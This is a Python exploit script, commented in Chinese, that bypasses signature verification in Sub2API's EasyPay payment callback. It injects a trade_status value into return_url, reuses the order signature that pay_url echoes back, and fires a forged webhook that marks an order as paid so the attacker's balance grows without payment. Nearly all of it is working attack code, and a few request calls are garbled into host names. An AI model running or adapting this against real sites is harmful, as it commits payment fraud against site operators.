#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sub2API 易支付(EasyPay) 回调验签绕过 —— 通用利用脚本
=====================================================
原理（三步，全程不需要 pkey）:
  1. 下单时把 return_url 构造成 .../payment/result?trade_status=TRADE_SUCCESS
     服务端 CanonicalizeReturnURL 只校验 scheme/host/path，不剥离用户 query，
     于是用户注入的 trade_status 被原样保留在 return_url 值里。
  2. 服务端算下单签名时按 k=v&k=v 直接拼值、不转义，
     return_url 值里那个 &trade_status=TRADE_SUCCESS 就"长"进了签名串内部。
     而下单签名随 pay_url 回显给下单者本人（popup / qrcode / hosted_redirect 都会暴露）。
  3. 伪造回调时把 return_url 只编码到 status=success 为止，
     让 &trade_status=TRADE_SUCCESS 以裸 & 升为顶层参数。
     服务端验签按 key 重排拼接 → 与下单签名串逐字节相同 → 验签通过 → 入账。

适用目标: 任何部署了 Sub2API(Wei-Shaw/sub2api) 且启用 easypay 通道的站点

用法:
  python easypay_forge_generic.py --target https://target267.example.com --token <JWT>
  python easypay_forge_generic.py --target https://target267.example.com --token <JWT> --amount 1 --dry-run

  --token  普通用户登录后的 JWT（浏览器 F12 → Application/LocalStorage，或抓包 Authorization 头）
  --dry-run 只做探测 + 算出伪造请求，不发回调（先把风险看清楚）

成功判据: webhook 回 "success" 且订单从 PENDING 变 COMPLETED、余额增加。
只用于已获授权的演练目标；只对自己账号的订单操作，不要刷单。
"""
import argparse
import json
import pathlib
import sys
import time
import urllib3
from urllib.parse import quote, urlsplit, parse_qsl, urlencode

import requests

urllib3.disable_warnings()

OUT = pathlib.Path(__file__).resolve().parent
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/141.0 Safari/537.36"


def sess(token=None):
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = UA
    if token:
        s.headers["Authorization"] = "Bearer " + token.strip()
    return s


def log(step, text, sink):
    line = f"[{step}] {text}"
    print(line)
    sink.append(line)


# ---------- 1. 识别: 目标是不是 Sub2API + 有没有开 easypay ----------
def probe(target, s, sink):
    log("probe", f"目标 {target}", sink)
    try:
        r = s.get(target + "/", timeout=15)
    except Exception as e:
        log("probe", f"首页不可达: {e}", sink)
        return None
    title = ""
    if "<title>" in r.text:
        title = r.text.split("<title>")[1].split("</title>")[0].strip()
    log("probe", f"首页 HTTP {r.status_code} | title={title!r} | Server={r.headers.get('Server')}", sink)
    if "sub2api" not in (title + r.text[:4000]).lower() and "api gateway" not in title.lower():
        log("probe", "警告: 页面没有 Sub2API 特征，可能不是该框架，继续探测接口", sink)

    cfg = None
    for path in ("/api/v1/payment/config", "/api/v1/payment/configs"):
        try:
            cr = s.get(target + path, timeout=15)
            log("probe", f"{path} -> HTTP {cr.status_code} {cr.text[:300]}", sink)
            if cr.status_code == 200 and "payment" in cr.text.lower():
                try:
                    cfg = cr.json()
                except Exception:
                    cfg = {"raw": cr.text[:500]}
                break
        except Exception as e:
            log("probe", f"{path} 异常: {e}", sink)
    return cfg


# ---------- 2. 下单并在 return_url 里注入 trade_status ----------
def create_order(target, s, amount, ptype, sink):
    # 注入点: return_url 的 query 里带 trade_status=TRADE_SUCCESS
    inj = f"{target}/payment/result?trade_status=TRADE_SUCCESS"
    body = {
        "amount": amount,
        "payment_type": ptype,
        "order_type": "balance",
        "is_mobile": False,
        "payment_source": "hosted_redirect",
        "return_url": inj,
    }
    log("order", f"POST {target}/api/v1/payment/orders body={json.dumps(body, ensure_ascii=False)}", sink)
    r = target8.example.com(target + "/api/v1/payment/orders", json=body, timeout=20)
    log("order", f"HTTP {r.status_code} {r.text[:800]}", sink)
    try:
        return r.json().get("data") or r.json()
    except Exception:
        return None


# ---------- 3. 从 pay_url 里取出攻击者需要的全部参数 ----------
def parse_pay_url(pay_url, sink):
    q = dict(parse_qsl(urlsplit(pay_url).query, keep_blank_values=True))
    ru_raw = q.get("return_url", "")
    # pay_url 里的 return_url 是 URL 编码过的, parse_qsl 已解码一次
    log("parse", f"pay_url 解析: pid={q.get('pid')} sign={q.get('sign')} out_trade_no={q.get('out_trade_no')}", sink)
    log("parse", f"回显的 return_url(解码后) = {ru_raw}", sink)
    return q, ru_raw


def build_callback(q, ru_decoded, sink):
    """核心: return_url 截断到 status=success, 让 trade_status 以裸 & 升为顶层参数"""
    if "&trade_status=" in ru_decoded:
        prefix = ru_decoded.split("&trade_status=")[0]
        log("forge", "服务端回显的 return_url 里保留了注入的 trade_status → 注入点成立", sink)
    elif "trade_status=" in ru_decoded:
        prefix = ru_decoded.split("trade_status=")[0].rstrip("&?")
        log("forge", "trade_status 在 return_url 开头, 截断到最后一段之前", sink)
    else:
        log("forge", "回显的 return_url 里没有 trade_status → 服务端剥离了用户 query, 该目标已修复此洞", sink)
        return None
    log("forge", f"回调用 return_url 前缀 = {prefix}", sink)

    # 按服务端验签会看到的字段顺序无关紧要(服务端自己排序), 关键是裸 & 让 trade_status 成为顶层参数
    parts = [
        "money=" + q.get("money", ""),
        "name=" + quote(q.get("name", ""), safe=""),
        "notify_url=" + quote(q.get("notify_url", ""), safe=""),
        "out_trade_no=" + q.get("out_trade_no", ""),
        "pid=" + q.get("pid", ""),
        "return_url=" + quote(prefix, safe=""),
        "trade_status=TRADE_SUCCESS",          # 裸 &, 走私出来的顶层参数
        "sign=" + q.get("sign", ""),
        "sign_type=" + q.get("sign_type", "MD5"),
        "type=" + q.get("type", "alipay"),
    ]
    return "&".join(parts)


# ---------- 4. 打回调 + 核对入账 ----------
def fire(target, s, body, sink):
    url = target + "/api/v1/payment/webhook/easypay"
    log("fire", f"POST {url}", sink)
    log("fire", f"body = {body}", sink)
    r = target8.example.com(url, data=body.encode(),
               headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=25)
    log("fire", f"HTTP {r.status_code} | body={r.text[:300]!r}", sink)
    return r


def verify(target, s, order_id, sink):
    ok = False
    for path in (f"/api/v1/payment/orders/{order_id}", f"/api/v1/payment/orders?id={order_id}"):
        try:
            r = s.get(target + path, timeout=15)
            log("verify", f"{path} -> HTTP {r.status_code} {r.text[:400]}", sink)
            if r.status_code == 200 and ("COMPLETED" in r.text or "SUCCESS" in r.text.upper()):
                ok = True
                break
        except Exception as e:
            log("verify", f"{path} 异常: {e}", sink)
    try:
        pr = s.get(target + "/api/v1/user/profile", timeout=15)
        log("verify", f"/api/v1/user/profile -> {pr.text[:300]}", sink)
    except Exception as e:
        log("verify", f"profile 异常: {e}", sink)
    return ok


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True, help="站点根 URL, 如 https://target267.example.com")
    ap.add_argument("--token", required=True, help="普通用户登录后的 JWT")
    ap.add_argument("--amount", default="1", help="下单金额(先小额, 默认 1)")
    ap.add_argument("--type", default="alipay", help="支付类型, 默认 alipay")
    ap.add_argument("--dry-run", action="store_true", help="只探测+构造, 不发回调")
    a = ap.parse_args()

    target = a.target.rstrip("/")
    if not target.startswith("http"):
        target = "https://" + target

    sink = []
    s = sess(a.token)

    cfg = probe(target, s, sink)
    if cfg:
        log("probe", f"payment config = {json.dumps(cfg, ensure_ascii=False)[:500]}", sink)
        types = json.dumps(cfg).lower()
        if "easypay" not in types and "易支付" not in types:
            log("probe", "警告: config 里没看到 easypay, 可能未启用该通道 → 后续回调会 404/verify failed", sink)

    order = create_order(target, s, a.amount, a.type, sink)
    if not order:
        log("order", "下单失败, 终止", sink)
        return 1
    order_id = order.get("order_id") or order.get("id")
    pay_url = order.get("pay_url") or order.get("payUrl") or ""
    log("order", f"order_id={order_id} payment_mode={order.get('payment_mode')} pay_url 长度={len(pay_url)}", sink)
    if not pay_url:
        log("order", "响应里没有 pay_url（可能是 qrcode 模式或前端另行拉取）→ 需从页面/接口再取一次", sink)
        return 1

    q, ru = parse_pay_url(pay_url, sink)
    for need in ("pid", "sign", "out_trade_no", "money"):
        if not q.get(need):
            log("parse", f"pay_url 缺少 {need}, 该目标可能不适合此链", sink)
            return 1

    body = build_callback(q, ru, sink)
    if not body:
        return 1

    if a.dry_run:
        log("dry-run", "已构造伪造回调但未发送。去掉 --dry-run 即真实投放。", sink)
    else:
        fire(target, s, body, sink)
        time.sleep(1)
        ok = verify(target, s, order_id, sink)
        log("result", f"入账判定: {'成功' if ok else '未确认（手动去订单页/余额页核对）'}", sink)

    ev = OUT / f"easypay-forge-{order_id or 'unknown'}.txt"
    ev.write_text("\n".join(sink), encoding="utf-8")
    print(f"\n[+] 证据写入 {ev}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
